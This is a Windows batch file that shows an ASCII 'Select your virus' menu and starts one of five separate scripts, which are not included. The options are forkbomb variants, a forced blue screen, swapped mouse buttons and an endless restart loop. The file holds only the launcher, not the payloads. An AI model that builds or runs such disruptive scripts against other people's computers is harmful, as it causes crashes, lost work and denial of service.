@echo off
title Virus selection
color 0a
echo.
echo  _____________________________________________________________________________________________________________________ 
echo ^|                                                                                                                     ^|
echo ^|                                                                                                                     ^|
echo ^|                                                                                                                     ^|
echo ^|                                                                                                                     ^|
echo ^|                      _____      _           _                                    _                                  ^|
echo ^|                     / ^_^_^_^_^|    ^| ^|         ^| ^|                                  (^_)                                 ^|
echo ^|                    ^| (^___   ___^| ^| ___  ___^| ^|_   _   _  ___  _   _ _ __  __   ___ _ __ _   _ ___   _               ^|
echo ^|                     \___ \ / _ \ ^|/ _ \/ __^| __^| ^| ^| ^| ^|/ _ \^| ^| ^| ^| '__^| \ \ / / ^| '__^| ^| ^| / __^| (^_)              ^|
echo ^|                     ____) ^|  __/ ^|  __/ (__^| ^|_  ^| ^|_^| ^| (^_) ^| ^|_^| ^| ^|     \ V /^| ^| ^|  ^| ^|_^| \__ \  _               ^|
echo ^|                    ^|_____/ \___^|_^|\___^|\___^|\__^|  \__, ^|\___/ \__,_^|_^|      \_/ ^|_^|_^|   \__,_^|___/ (^_)              ^|
echo ^|                                                    __/ ^|                                                            ^|
echo ^|                                                   ^|___/                                                             ^|
echo ^|                                                                                                                     ^|
echo ^|                                                                                                                     ^|
echo ^|                                                                                                                     ^|
echo ^|                                                 1. Classic forkbomb                                                 ^|
echo ^|                                                                                                                     ^|
echo ^|                                                  2. Ultra forkbomb                                                  ^|
echo ^|                                                                                                                     ^|
echo ^|                                                      3. BSOD                                                        ^|
echo ^|                                                                                                                     ^|
echo ^|                                                4. Swap mouse buttons                                                ^|
echo ^|                                                                                                                     ^|
echo ^|                                                5. Infinite restart                                                  ^|
echo ^|                                                                                                                     ^|
echo ^|                                                                                                                     ^|
echo ^|_____________________________________________________________________________________________________________________^|
echo.
echo.
choice /c:12345 /n /m "|"
if %errorlevel%==1 goto virus1
if %errorlevel%==2 goto virus2
if %errorlevel%==3 goto virus3
if %errorlevel%==4 goto virus4
if %errorlevel%==5 goto virus5

:virus1
start forkbomb-classic.bat
exit

:virus2
start forkbomb-ultra.bat
exit

:virus3
start bsod.bat
exit

:virus4
start swapmouse.bat
exit

:virus5
start restart.bat
exit